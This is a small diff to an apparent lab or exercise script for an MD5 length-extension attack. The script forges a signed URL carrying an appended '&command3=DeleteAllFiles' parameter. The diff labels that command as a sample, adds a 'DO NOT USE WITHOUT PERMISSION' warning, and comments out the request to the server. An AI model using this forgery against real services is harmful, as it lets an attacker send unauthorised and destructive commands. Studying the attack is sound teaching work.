@@ -19,7 +19,7 @@ print(bits)
 
 #establish new initialization vector and append command
 h = md5(state=curhash.decode("hex"), count=bits)
-x = "&command3=DeleteAllFiles"
+x = "&command3=DeleteAllFiles" #sample appended command
 h.update(x)
 
 #generate new hash and url
@@ -35,10 +35,13 @@ url = prehash+newhash+"&"+msg
 print("New url is: ")
 print(url)
 
+#DO NOT USE WITHOUT PERMISSION
+'''
 print("Trying new url. Server output below: ")
 
 parsedUrl = urlparse.urlparse(url)
 conn = httplib.HTTPConnection(parsedUrl.hostname)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
 print conn.getresponse().read()
+'''
 
